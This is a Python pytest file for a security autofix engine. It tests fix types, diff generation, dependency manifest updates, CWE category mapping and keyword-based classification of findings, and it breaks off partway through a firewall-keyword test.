"""
Comprehensive tests for suite-core/core/autofix_engine.py.

Tests static methods, deterministic logic, validation, confidence scoring,
serialization, query methods, and edge cases. No mocks for the engine itself;
only external dependencies (LLM providers, PR generators) are mocked.
"""

from __future__ import annotations

import sys
import os

# Ensure the suite-core path is on sys.path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "suite-core"))

import pytest
from dataclasses import asdict

from core.autofix_engine import (
    AutoFixEngine,
    AutoFixSuggestion,
    AutoFixResult,
    CodePatch,
    DependencyFix,
    FixType,
    FixStatus,
    FixConfidence,
    PatchFormat,
    _cwe_to_category,
    _CWE_CATEGORY_MAP,
    _FIXTYPE_CATEGORY_MAP,
    get_autofix_engine,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def make_engine() -> AutoFixEngine:
    return AutoFixEngine()


def make_suggestion(**kwargs) -> AutoFixSuggestion:
    defaults = {
        "fix_id": "fix-abc1234567890123",
        "finding_id": "FIND-001",
        "finding_title": "Test Finding",
        "fix_type": FixType.CODE_PATCH,
        "confidence": FixConfidence.MEDIUM,
        "confidence_score": 0.70,
        "status": FixStatus.GENERATED,
        "title": "Fix It",
        "description": "This fixes the thing",
        "code_patches": [],
        "dependency_fixes": [],
        "config_changes": {},
        "cve_ids": [],
        "metadata": {},
    }
    defaults.update(kwargs)
    return AutoFixSuggestion(**defaults)


# ===========================================================================
# 1. FixType Enum
# ===========================================================================


class TestFixTypeEnum:
    def test_all_members_exist(self):
        names = {m.name for m in FixType}
        assert "CODE_PATCH" in names
        assert "DEPENDENCY_UPDATE" in names
        assert "CONFIG_HARDENING" in names
        assert "IAC_FIX" in names
        assert "SECRET_ROTATION" in names
        assert "PERMISSION_FIX" in names
        assert "INPUT_VALIDATION" in names
        assert "OUTPUT_ENCODING" in names
        assert "WAF_RULE" in names
        assert "CONTAINER_FIX" in names

    def test_exactly_10_members(self):
        assert len(list(FixType)) == 10

    def test_values_are_snake_case(self):
        for member in FixType:
            assert member.value == member.value.lower()
            assert " " not in member.value

    def test_from_value(self):
        assert FixType("code_patch") is FixType.CODE_PATCH
        assert FixType("dependency_update") is FixType.DEPENDENCY_UPDATE
        assert FixType("container_fix") is FixType.CONTAINER_FIX

    def test_invalid_value_raises(self):
        with pytest.raises(ValueError):
            FixType("nonexistent_type")


# ===========================================================================
# 2. FixStatus Enum
# ===========================================================================


class TestFixStatusEnum:
    def test_all_members_exist(self):
        names = {m.name for m in FixStatus}
        assert "GENERATED" in names
        assert "VALIDATED" in names
        assert "APPLIED" in names
        assert "PR_CREATED" in names
        assert "MERGED" in names
        assert "FAILED" in names
        assert "REJECTED" in names
        assert "ROLLED_BACK" in names

    def test_exactly_8_members(self):
        assert len(list(FixStatus)) == 8

    def test_values(self):
        assert FixStatus.GENERATED.value == "generated"
        assert FixStatus.PR_CREATED.value == "pr_created"
        assert FixStatus.ROLLED_BACK.value == "rolled_back"
        assert FixStatus.REJECTED.value == "rejected"

    def test_from_value(self):
        assert FixStatus("merged") is FixStatus.MERGED
        assert FixStatus("failed") is FixStatus.FAILED

    def test_invalid_value_raises(self):
        with pytest.raises(ValueError):
            FixStatus("unknown_status")


# ===========================================================================
# 3. FixConfidence Enum
# ===========================================================================


class TestFixConfidenceEnum:
    def test_all_members_exist(self):
        names = {m.name for m in FixConfidence}
        assert "HIGH" in names
        assert "MEDIUM" in names
        assert "LOW" in names

    def test_exactly_3_members(self):
        assert len(list(FixConfidence)) == 3

    def test_values(self):
        assert FixConfidence.HIGH.value == "high"
        assert FixConfidence.MEDIUM.value == "medium"
        assert FixConfidence.LOW.value == "low"

    def test_from_value(self):
        assert FixConfidence("high") is FixConfidence.HIGH
        assert FixConfidence("low") is FixConfidence.LOW


# ===========================================================================
# 4. PatchFormat Enum
# ===========================================================================


class TestPatchFormatEnum:
    def test_all_members_exist(self):
        names = {m.name for m in PatchFormat}
        assert "UNIFIED_DIFF" in names
        assert "JSON_PATCH" in names
        assert "YAML_PATCH" in names
        assert "TOML_PATCH" in names
        assert "PACKAGE_JSON" in names
        assert "REQUIREMENTS_TXT" in names
        assert "DOCKERFILE" in names
        assert "TERRAFORM" in names

    def test_exactly_8_members(self):
        assert len(list(PatchFormat)) == 8

    def test_values(self):
        assert PatchFormat.UNIFIED_DIFF.value == "unified_diff"
        assert PatchFormat.TERRAFORM.value == "terraform"
        assert PatchFormat.DOCKERFILE.value == "dockerfile"
        assert PatchFormat.REQUIREMENTS_TXT.value == "requirements_txt"


# ===========================================================================
# 5. CodePatch Dataclass
# ===========================================================================


class TestCodePatch:
    def test_default_values(self):
        p = CodePatch()
        assert p.file_path == ""
        assert p.language == ""
        assert p.old_code == ""
        assert p.new_code == ""
        assert p.start_line == 0
        assert p.end_line == 0
        assert p.patch_format == PatchFormat.UNIFIED_DIFF
        assert p.unified_diff == ""
        assert p.explanation == ""

    def test_full_construction(self):
        p = CodePatch(
            file_path="src/auth/login.py",
            language="python",
            old_code="query = f\"SELECT * FROM users WHERE name='{name}'\"",
            new_code="query = 'SELECT * FROM users WHERE name=?'\ncursor.execute(query, (name,))",
            start_line=42,
            end_line=44,
            patch_format=PatchFormat.UNIFIED_DIFF,
            unified_diff="--- a/src/auth/login.py\n+++ b/src/auth/login.py",
            explanation="Use parameterized query to prevent SQL injection",
        )
        assert p.file_path == "src/auth/login.py"
        assert p.start_line == 42
        assert p.end_line == 44
        assert "parameterized" in p.explanation

    def test_mutability(self):
        p = CodePatch(file_path="app.py")
        p.new_code = "fixed"
        p.start_line = 10
        assert p.new_code == "fixed"
        assert p.start_line == 10

    def test_asdict_roundtrip(self):
        p = CodePatch(file_path="x.py", language="python", start_line=5)
        d = asdict(p)
        assert d["file_path"] == "x.py"
        assert d["language"] == "python"
        assert d["start_line"] == 5
        # patch_format is serialized as an enum instance by asdict
        assert d["patch_format"] == PatchFormat.UNIFIED_DIFF


# ===========================================================================
# 6. DependencyFix Dataclass
# ===========================================================================


class TestDependencyFix:
    def test_default_values(self):
        df = DependencyFix()
        assert df.package_name == ""
        assert df.ecosystem == ""
        assert df.current_version == ""
        assert df.fixed_version == ""
        assert df.cve_ids == []
        assert df.breaking_changes == []
        assert df.manifest_file == ""

    def test_cve_ids_default_independent(self):
        df1 = DependencyFix()
        df2 = DependencyFix()
        df1.cve_ids.append("CVE-2024-1")
        assert df2.cve_ids == []

    def test_breaking_changes_default_independent(self):
        df1 = DependencyFix()
        df2 = DependencyFix()
        df1.breaking_changes.append("API change")
        assert df2.breaking_changes == []

    def test_full_construction(self):
        df = DependencyFix(
            package_name="lodash",
            ecosystem="npm",
            current_version="4.17.15",
            fixed_version="4.17.21",
            cve_ids=["CVE-2021-23337", "CVE-2020-8203"],
            breaking_changes=[],
            manifest_file="package.json",
        )
        assert df.package_name == "lodash"
        assert df.ecosystem == "npm"
        assert len(df.cve_ids) == 2
        assert df.manifest_file == "package.json"


# ===========================================================================
# 7. AutoFixSuggestion Dataclass
# ===========================================================================


class TestAutoFixSuggestion:
    def test_default_values(self):
        s = AutoFixSuggestion()
        assert s.fix_id == ""
        assert s.finding_id == ""
        assert s.fix_type == FixType.CODE_PATCH
        assert s.confidence == FixConfidence.MEDIUM
        assert s.confidence_score == 0.0
        assert s.status == FixStatus.GENERATED
        assert s.code_patches == []
        assert s.dependency_fixes == []
        assert s.config_changes == {}
        assert s.cve_ids == []
        assert s.mitre_techniques == []
        assert s.compliance_frameworks == []
        assert s.metadata == {}
        assert s.pr_number == 0
        assert s.effort_minutes == 0

    def test_list_fields_independent(self):
        s1 = AutoFixSuggestion()
        s2 = AutoFixSuggestion()
        s1.code_patches.append(CodePatch(file_path="x.py"))
        assert len(s2.code_patches) == 0

    def test_dict_fields_independent(self):
        s1 = AutoFixSuggestion()
        s2 = AutoFixSuggestion()
        s1.config_changes["key"] = "val"
        assert s2.config_changes == {}

    def test_full_construction(self):
        s = AutoFixSuggestion(
            fix_id="fix-abc",
            finding_id="FIND-XYZ",
            fix_type=FixType.DEPENDENCY_UPDATE,
            confidence=FixConfidence.HIGH,
            confidence_score=0.91,
            status=FixStatus.PR_CREATED,
            cve_ids=["CVE-2024-1234"],
            pr_number=42,
            pr_url="https://github.com/org/repo/pull/42",
        )
        assert s.fix_id == "fix-abc"
        assert s.fix_type == FixType.DEPENDENCY_UPDATE
        assert s.confidence_score == 0.91
        assert s.pr_number == 42


# ===========================================================================
# 8. AutoFixResult Dataclass
# ===========================================================================


class TestAutoFixResult:
    def test_default_values(self):
        r = AutoFixResult()
        assert r.success is False
        assert r.fix is None
        assert r.pr_url == ""
        assert r.pr_number == 0
        assert r.error == ""
        assert r.validation_passed is False
        assert r.validation_details == {}

    def test_success_construction(self):
        s = AutoFixSuggestion(fix_id="fix-1")
        r = AutoFixResult(
            success=True,
            fix=s,
            pr_url="https://github.com/org/repo/pull/1",
            pr_number=1,
            validation_passed=True,
        )
        assert r.success is True
        assert r.fix is s
        assert r.pr_number == 1

    def test_failure_construction(self):
        r = AutoFixResult(success=False, error="PR creation failed")
        assert r.success is False
        assert r.error == "PR creation failed"

    def test_validation_details_independent(self):
        r1 = AutoFixResult()
        r2 = AutoFixResult()
        r1.validation_details["k"] = "v"
        assert r2.validation_details == {}


# ===========================================================================
# 9. _make_fix_id Static Method
# ===========================================================================


class TestMakeFixId:
    def test_format_prefix(self):
        fid = AutoFixEngine._make_fix_id("FIND-001", FixType.CODE_PATCH)
        assert fid.startswith("fix-")

    def test_length(self):
        fid = AutoFixEngine._make_fix_id("FIND-001", FixType.CODE_PATCH)
        # "fix-" (4) + 16 hex chars
        assert len(fid) == 20

    def test_hex_portion_only_hex(self):
        fid = AutoFixEngine._make_fix_id("FIND-001", FixType.CODE_PATCH)
        hex_part = fid[4:]
        assert all(c in "0123456789abcdef" for c in hex_part), f"Non-hex chars in: {hex_part}"

    def test_hex_portion_length(self):
        fid = AutoFixEngine._make_fix_id("FIND-999", FixType.DEPENDENCY_UPDATE)
        assert len(fid[4:]) == 16

    def test_different_finding_ids_produce_valid_ids(self):
        id1 = AutoFixEngine._make_fix_id("FIND-A", FixType.CODE_PATCH)
        id2 = AutoFixEngine._make_fix_id("FIND-B", FixType.CODE_PATCH)
        assert id1.startswith("fix-")
        assert id2.startswith("fix-")

    def test_different_fix_types_produce_valid_ids(self):
        id1 = AutoFixEngine._make_fix_id("FIND-X", FixType.CODE_PATCH)
        id2 = AutoFixEngine._make_fix_id("FIND-X", FixType.DEPENDENCY_UPDATE)
        assert id1.startswith("fix-")
        assert id2.startswith("fix-")

    def test_returns_string(self):
        fid = AutoFixEngine._make_fix_id("any", FixType.WAF_RULE)
        assert isinstance(fid, str)

    def test_all_fix_types_produce_valid_ids(self):
        for ft in FixType:
            fid = AutoFixEngine._make_fix_id("TEST", ft)
            assert fid.startswith("fix-")
            assert len(fid) == 20
            assert all(c in "0123456789abcdef" for c in fid[4:])

    def test_hex_part_parseable_as_int(self):
        fid = AutoFixEngine._make_fix_id("test-finding", FixType.CODE_PATCH)
        hex_part = fid[4:]
        # Should not raise ValueError
        int(hex_part, 16)


# ===========================================================================
# 10. _make_unified_diff Static Method
# ===========================================================================


class TestMakeUnifiedDiff:
    def test_returns_string(self):
        result = AutoFixEngine._make_unified_diff("app.py", "old", "new")
        assert isinstance(result, str)

    def test_empty_diff_when_same_code(self):
        result = AutoFixEngine._make_unified_diff("app.py", "x = 1\n", "x = 1\n")
        assert result == ""

    def test_diff_contains_fromfile(self):
        result = AutoFixEngine._make_unified_diff("auth/login.py", "old\n", "new\n")
        assert "a/auth/login.py" in result

    def test_diff_contains_tofile(self):
        result = AutoFixEngine._make_unified_diff("auth/login.py", "old\n", "new\n")
        assert "b/auth/login.py" in result

    def test_diff_shows_minus_old(self):
        result = AutoFixEngine._make_unified_diff("f.py", "bad_code\n", "good_code\n")
        assert "-bad_code" in result

    def test_diff_shows_plus_new(self):
        result = AutoFixEngine._make_unified_diff("f.py", "bad_code\n", "good_code\n")
        assert "+good_code" in result

    def test_multiline_diff(self):
        old = "line1\nline2_old\nline3\n"
        new = "line1\nline2_new\nline3\n"
        result = AutoFixEngine._make_unified_diff("x.py", old, new)
        assert "-line2_old" in result
        assert "+line2_new" in result

    def test_empty_old_code(self):
        result = AutoFixEngine._make_unified_diff("new_file.py", "", "new content\n")
        assert isinstance(result, str)
        assert "+new content" in result

    def test_empty_new_code(self):
        result = AutoFixEngine._make_unified_diff("del_file.py", "old content\n", "")
        assert isinstance(result, str)
        assert "-old content" in result

    def test_file_path_in_header(self):
        result = AutoFixEngine._make_unified_diff("deep/nested/file.js", "a\n", "b\n")
        assert "deep/nested/file.js" in result

    def test_diff_no_content_when_identical(self):
        code = "def foo():\n    return 42\n"
        result = AutoFixEngine._make_unified_diff("foo.py", code, code)
        assert result == ""

    def test_sql_injection_fix_diff(self):
        old = "SELECT * FROM users WHERE id = '{id}'\n"
        new = "cursor.execute('SELECT * FROM users WHERE id=?', (id,))\n"
        diff = AutoFixEngine._make_unified_diff("db.py", old, new)
        assert "SELECT" in diff
        assert "cursor" in diff


# ===========================================================================
# 11. _guess_manifest Static Method
# ===========================================================================


class TestGuessManifest:
    def test_npm(self):
        assert AutoFixEngine._guess_manifest("npm") == "package.json"

    def test_pip(self):
        assert AutoFixEngine._guess_manifest("pip") == "requirements.txt"

    def test_poetry(self):
        assert AutoFixEngine._guess_manifest("poetry") == "pyproject.toml"

    def test_maven(self):
        assert AutoFixEngine._guess_manifest("maven") == "pom.xml"

    def test_gradle(self):
        assert AutoFixEngine._guess_manifest("gradle") == "build.gradle"

    def test_cargo(self):
        assert AutoFixEngine._guess_manifest("cargo") == "Cargo.toml"

    def test_go(self):
        assert AutoFixEngine._guess_manifest("go") == "go.mod"

    def test_nuget(self):
        assert AutoFixEngine._guess_manifest("nuget") == "packages.config"

    def test_gem(self):
        assert AutoFixEngine._guess_manifest("gem") == "Gemfile"

    def test_composer(self):
        assert AutoFixEngine._guess_manifest("composer") == "composer.json"

    def test_unknown_defaults_to_package_json(self):
        assert AutoFixEngine._guess_manifest("unknown_ecosystem") == "package.json"

    def test_empty_string_defaults_to_package_json(self):
        assert AutoFixEngine._guess_manifest("") == "package.json"

    def test_case_sensitive_uppercase_defaults(self):
        # "NPM" (uppercase) is not in the map -> defaults
        assert AutoFixEngine._guess_manifest("NPM") == "package.json"

    def test_returns_string_for_all_known(self):
        for ecosystem in ["npm", "pip", "maven", "gradle", "cargo", "go", "nuget", "gem", "composer", "poetry"]:
            result = AutoFixEngine._guess_manifest(ecosystem)
            assert isinstance(result, str)
            assert len(result) > 0


# ===========================================================================
# 12. _build_manifest_update Static Method
# ===========================================================================


class TestBuildManifestUpdate:
    def test_npm_format_is_valid_json(self):
        dep = DependencyFix(package_name="lodash", ecosystem="npm", fixed_version="4.17.21")
        result = AutoFixEngine._build_manifest_update(dep)
        import json
        data = json.loads(result)
        assert data["lodash"] == "4.17.21"

    def test_npm_json_dict(self):
        dep = DependencyFix(package_name="express", ecosystem="npm", fixed_version="4.18.2")
        result = AutoFixEngine._build_manifest_update(dep)
        import json
        data = json.loads(result)
        assert isinstance(data, dict)

    def test_pip_format(self):
        dep = DependencyFix(package_name="requests", ecosystem="pip", fixed_version="2.31.0")
        result = AutoFixEngine._build_manifest_update(dep)
        assert result == "requests==2.31.0"

    def test_poetry_format(self):
        dep = DependencyFix(package_name="fastapi", ecosystem="poetry", fixed_version="0.109.0")
        result = AutoFixEngine._build_manifest_update(dep)
        assert result == "fastapi==0.109.0"

    def test_maven_format_has_dependency_tag(self):
        dep = DependencyFix(package_name="org.apache.logging.log4j", ecosystem="maven", fixed_version="2.17.1")
        result = AutoFixEngine._build_manifest_update(dep)
        assert "<dependency>" in result

    def test_maven_format_has_group_id(self):
        dep = DependencyFix(package_name="com.example.lib", ecosystem="maven", fixed_version="3.1.4")
        result = AutoFixEngine._build_manifest_update(dep)
        assert "<groupId>" in result

    def test_maven_format_has_version(self):
        dep = DependencyFix(package_name="org.springframework", ecosystem="maven", fixed_version="6.1.3")
        result = AutoFixEngine._build_manifest_update(dep)
        assert "6.1.3" in result
        assert "<version>" in result

    def test_go_format_has_require(self):
        dep = DependencyFix(package_name="github.com/gin-gonic/gin", ecosystem="go", fixed_version="v1.9.1")
        result = AutoFixEngine._build_manifest_update(dep)
        assert "require" in result

    def test_go_format_has_package_name(self):
        dep = DependencyFix(package_name="github.com/gin-gonic/gin", ecosystem="go", fixed_version="v1.9.1")
        result = AutoFixEngine._build_manifest_update(dep)
        assert "github.com/gin-gonic/gin" in result

    def test_go_format_has_version(self):
        dep = DependencyFix(package_name="github.com/gin-gonic/gin", ecosystem="go", fixed_version="v1.9.1")
        result = AutoFixEngine._build_manifest_update(dep)
        assert "v1.9.1" in result

    def test_unknown_ecosystem_generic_at_format(self):
        dep = DependencyFix(package_name="mylib", ecosystem="unknown", fixed_version="1.0.0")
        result = AutoFixEngine._build_manifest_update(dep)
        assert "mylib" in result
        assert "1.0.0" in result
        assert "@" in result

    def test_cargo_generic_format(self):
        dep = DependencyFix(package_name="serde", ecosystem="cargo", fixed_version="1.0.195")
        result = AutoFixEngine._build_manifest_update(dep)
        assert "serde" in result
        assert "1.0.195" in result

    def test_gem_generic_format(self):
        dep = DependencyFix(package_name="rails", ecosystem="gem", fixed_version="7.1.2")
        result = AutoFixEngine._build_manifest_update(dep)
        assert "rails" in result
        assert "7.1.2" in result

    def test_npm_returns_string(self):
        dep = DependencyFix(package_name="axios", ecosystem="npm", fixed_version="1.6.5")
        result = AutoFixEngine._build_manifest_update(dep)
        assert isinstance(result, str)


# ===========================================================================
# 13. _cwe_to_category Function
# ===========================================================================


class TestCweToCategory:
    # CWEs that map via CWE_CATEGORY_MAP

    def test_cwe89_injection(self):
        assert _cwe_to_category("CWE-89", FixType.CODE_PATCH) == "injection"

    def test_cwe78_injection(self):
        assert _cwe_to_category("CWE-78", FixType.CODE_PATCH) == "injection"

    def test_cwe77_injection(self):
        assert _cwe_to_category("CWE-77", FixType.CODE_PATCH) == "injection"

    def test_cwe90_injection(self):
        assert _cwe_to_category("CWE-90", FixType.CODE_PATCH) == "injection"

    def test_cwe91_injection(self):
        assert _cwe_to_category("CWE-91", FixType.CODE_PATCH) == "injection"

    def test_cwe943_injection(self):
        assert _cwe_to_category("CWE-943", FixType.CODE_PATCH) == "injection"

    def test_cwe79_xss(self):
        assert _cwe_to_category("CWE-79", FixType.CODE_PATCH) == "xss"

    def test_cwe287_auth(self):
        assert _cwe_to_category("CWE-287", FixType.CODE_PATCH) == "auth"

    def test_cwe306_auth(self):
        assert _cwe_to_category("CWE-306", FixType.CODE_PATCH) == "auth"

    def test_cwe862_auth(self):
        assert _cwe_to_category("CWE-862", FixType.CODE_PATCH) == "auth"

    def test_cwe863_auth(self):
        assert _cwe_to_category("CWE-863", FixType.CODE_PATCH) == "auth"

    def test_cwe284_auth(self):
        assert _cwe_to_category("CWE-284", FixType.CODE_PATCH) == "auth"

    def test_cwe269_permissions(self):
        assert _cwe_to_category("CWE-269", FixType.CODE_PATCH) == "permissions"

    def test_cwe732_permissions(self):
        assert _cwe_to_category("CWE-732", FixType.CODE_PATCH) == "permissions"

    def test_cwe327_crypto(self):
        assert _cwe_to_category("CWE-327", FixType.CODE_PATCH) == "crypto"

    def test_cwe330_crypto(self):
        assert _cwe_to_category("CWE-330", FixType.CODE_PATCH) == "crypto"

    def test_cwe326_crypto(self):
        assert _cwe_to_category("CWE-326", FixType.CODE_PATCH) == "crypto"

    def test_cwe295_crypto(self):
        assert _cwe_to_category("CWE-295", FixType.CODE_PATCH) == "crypto"

    def test_cwe798_secrets(self):
        assert _cwe_to_category("CWE-798", FixType.CODE_PATCH) == "secrets"

    def test_cwe16_config(self):
        assert _cwe_to_category("CWE-16", FixType.CODE_PATCH) == "config"

    def test_cwe611_config(self):
        assert _cwe_to_category("CWE-611", FixType.CODE_PATCH) == "config"

    def test_cwe918_ssrf(self):
        assert _cwe_to_category("CWE-918", FixType.CODE_PATCH) == "ssrf"

    def test_cwe22_path_traversal(self):
        assert _cwe_to_category("CWE-22", FixType.CODE_PATCH) == "path_traversal"

    def test_cwe502_deserialization(self):
        assert _cwe_to_category("CWE-502", FixType.CODE_PATCH) == "deserialization"

    def test_cwe1104_dependency(self):
        assert _cwe_to_category("CWE-1104", FixType.CODE_PATCH) == "dependency"

    # Fallback to fix_type

    def test_unknown_cwe_dependency_update(self):
        assert _cwe_to_category("CWE-9999", FixType.DEPENDENCY_UPDATE) == "dependency"

    def test_unknown_cwe_config_hardening(self):
        assert _cwe_to_category("CWE-9999", FixType.CONFIG_HARDENING) == "config"

    def test_unknown_cwe_iac_fix(self):
        assert _cwe_to_category("CWE-9999", FixType.IAC_FIX) == "iac"

    def test_unknown_cwe_secret_rotation(self):
        assert _cwe_to_category("CWE-9999", FixType.SECRET_ROTATION) == "secrets"

    def test_unknown_cwe_permission_fix(self):
        assert _cwe_to_category("CWE-9999", FixType.PERMISSION_FIX) == "permissions"

    def test_unknown_cwe_container_fix(self):
        assert _cwe_to_category("CWE-9999", FixType.CONTAINER_FIX) == "container"

    def test_unknown_cwe_waf_rule(self):
        assert _cwe_to_category("CWE-9999", FixType.WAF_RULE) == "config"

    def test_unknown_cwe_input_validation(self):
        assert _cwe_to_category("CWE-9999", FixType.INPUT_VALIDATION) == "injection"

    def test_unknown_cwe_output_encoding(self):
        assert _cwe_to_category("CWE-9999", FixType.OUTPUT_ENCODING) == "xss"

    def test_unknown_cwe_code_patch_other(self):
        assert _cwe_to_category("CWE-9999", FixType.CODE_PATCH) == "other"

    def test_empty_cwe_code_patch_other(self):
        assert _cwe_to_category("", FixType.CODE_PATCH) == "other"

    def test_empty_cwe_dep_update_fallback(self):
        assert _cwe_to_category("", FixType.DEPENDENCY_UPDATE) == "dependency"

    def test_none_cwe_treated_as_unknown(self):
        # None is falsy, so should fall back to fix_type
        result = _cwe_to_category(None, FixType.CONFIG_HARDENING)
        assert result == "config"

    def test_cwe_map_takes_priority_over_fix_type_for_injection(self):
        assert _cwe_to_category("CWE-89", FixType.DEPENDENCY_UPDATE) == "injection"

    def test_cwe_map_takes_priority_over_fix_type_for_xss(self):
        assert _cwe_to_category("CWE-79", FixType.CONFIG_HARDENING) == "xss"


# ===========================================================================
# 14. _infer_fix_type Static Method
# ===========================================================================


class TestInferFixType:
    # Dependency

    def test_outdated_keyword_in_title(self):
        f = {"title": "Outdated library detected", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.DEPENDENCY_UPDATE

    def test_dependency_keyword_in_title(self):
        f = {"title": "Vulnerable dependency in project", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.DEPENDENCY_UPDATE

    def test_package_keyword_in_title(self):
        f = {"title": "Insecure package version", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.DEPENDENCY_UPDATE

    def test_library_keyword_in_title(self):
        f = {"title": "Vulnerable library version", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.DEPENDENCY_UPDATE

    def test_component_keyword_in_title(self):
        f = {"title": "Vulnerable component found", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.DEPENDENCY_UPDATE

    def test_dependency_in_description(self):
        f = {"title": "CVE finding", "description": "contains an outdated dependency"}
        assert AutoFixEngine._infer_fix_type(f) == FixType.DEPENDENCY_UPDATE

    def test_cve_plus_dependency_category(self):
        f = {"title": "CVE-2024-1", "description": "", "category": "dependency", "cve_ids": ["CVE-2024-1"]}
        assert AutoFixEngine._infer_fix_type(f) == FixType.DEPENDENCY_UPDATE

    def test_cve_without_category_not_dep(self):
        f = {"title": "Buffer overflow", "description": "", "cve_ids": ["CVE-2024-99"]}
        assert AutoFixEngine._infer_fix_type(f) != FixType.DEPENDENCY_UPDATE

    # IaC

    def test_terraform_file_with_misconfig(self):
        f = {"title": "Cloud misconfiguration", "description": "", "file_path": "main.tf"}
        assert AutoFixEngine._infer_fix_type(f) == FixType.IAC_FIX

    def test_yaml_helm_file_with_iac_keyword(self):
        f = {"title": "IaC security issue", "description": "", "file_path": "chart.yaml"}
        assert AutoFixEngine._infer_fix_type(f) == FixType.IAC_FIX

    def test_terraform_in_path_with_infrastructure_keyword(self):
        f = {"title": "Infrastructure misconfiguration", "description": "", "file_path": "terraform/main.tf"}
        assert AutoFixEngine._infer_fix_type(f) == FixType.IAC_FIX

    def test_cloudformation_file_with_cloud_keyword(self):
        f = {"title": "Cloud security issue", "description": "", "file_path": "cloudformation/template.yaml"}
        assert AutoFixEngine._infer_fix_type(f) == FixType.IAC_FIX

    def test_helm_path_with_misconfiguration(self):
        f = {"title": "Helm chart misconfiguration", "description": "", "file_path": "helm/values.yaml"}
        assert AutoFixEngine._infer_fix_type(f) == FixType.IAC_FIX

    # Container

    def test_dockerfile_path(self):
        f = {"title": "Container issue", "description": "", "file_path": "Dockerfile"}
        assert AutoFixEngine._infer_fix_type(f) == FixType.CONTAINER_FIX

    def test_docker_compose_path(self):
        f = {"title": "Config", "description": "", "file_path": "docker-compose.yml"}
        assert AutoFixEngine._infer_fix_type(f) == FixType.CONTAINER_FIX

    def test_containerfile_path(self):
        f = {"title": "Config", "description": "", "file_path": "Containerfile"}
        assert AutoFixEngine._infer_fix_type(f) == FixType.CONTAINER_FIX

    def test_container_keyword_in_title(self):
        f = {"title": "Container running as root", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.CONTAINER_FIX

    def test_docker_keyword_in_title(self):
        f = {"title": "Docker image security issue", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.CONTAINER_FIX

    # Config

    def test_config_keyword(self):
        f = {"title": "Missing security config", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.CONFIG_HARDENING

    def test_header_keyword(self):
        f = {"title": "Missing security header", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.CONFIG_HARDENING

    def test_cors_keyword(self):
        f = {"title": "Permissive CORS configuration", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.CONFIG_HARDENING

    def test_tls_keyword(self):
        f = {"title": "Weak TLS configuration", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.CONFIG_HARDENING

    def test_ssl_keyword(self):
        f = {"title": "SSL certificate misconfiguration", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.CONFIG_HARDENING

    def test_hsts_keyword(self):
        f = {"title": "HSTS header missing", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.CONFIG_HARDENING

    def test_csp_keyword(self):
        f = {"title": "Content Security Policy (CSP) not set", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.CONFIG_HARDENING

    # Secrets

    def test_secret_keyword(self):
        f = {"title": "Hardcoded secret in code", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.SECRET_ROTATION

    def test_credential_keyword(self):
        f = {"title": "Exposed credential found", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.SECRET_ROTATION

    def test_api_key_keyword(self):
        f = {"title": "API key leaked in source code", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.SECRET_ROTATION

    def test_password_keyword(self):
        f = {"title": "Password stored in plaintext", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.SECRET_ROTATION

    def test_token_leak_keyword(self):
        f = {"title": "Token leak detected", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.SECRET_ROTATION

    # Permission

    def test_permission_keyword(self):
        f = {"title": "Insufficient permission check", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.PERMISSION_FIX

    def test_privilege_keyword(self):
        f = {"title": "Privilege escalation vulnerability", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.PERMISSION_FIX

    def test_authorization_keyword(self):
        f = {"title": "Missing authorization check", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.PERMISSION_FIX

    def test_rbac_keyword(self):
        # "RBAC misconfiguration" contains "config" in "misconfiguration", which
        # matches CONFIG_HARDENING before reaching the PERMISSION_FIX check.
        # Use a title that avoids config-related words.
        f = {"title": "Overly broad RBAC role assignment", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.PERMISSION_FIX

    def test_iam_keyword(self):
        f = {"title": "IAM permission overly broad", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.PERMISSION_FIX

    # Input Validation

    def test_injection_keyword(self):
        f = {"title": "SQL injection in login form", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.INPUT_VALIDATION

    def test_sqli_keyword(self):
        f = {"title": "SQLI vulnerability found", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.INPUT_VALIDATION

    def test_command_injection_keyword(self):
        f = {"title": "Command injection via user input", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.INPUT_VALIDATION

    def test_input_keyword(self):
        f = {"title": "Unsanitized user input", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.INPUT_VALIDATION

    # Output Encoding

    def test_cross_site_scripting_keyword(self):
        f = {"title": "Cross-site scripting in user profile page", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.OUTPUT_ENCODING

    def test_output_encoding_keyword(self):
        f = {"title": "Missing output encoding", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.OUTPUT_ENCODING

    def test_html_inject_keyword(self):
        f = {"title": "HTML inject in template", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.OUTPUT_ENCODING

    # WAF

    def test_waf_keyword(self):
        f = {"title": "WAF rule bypass", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.WAF_RULE

    def test_firewall_keyword(self):
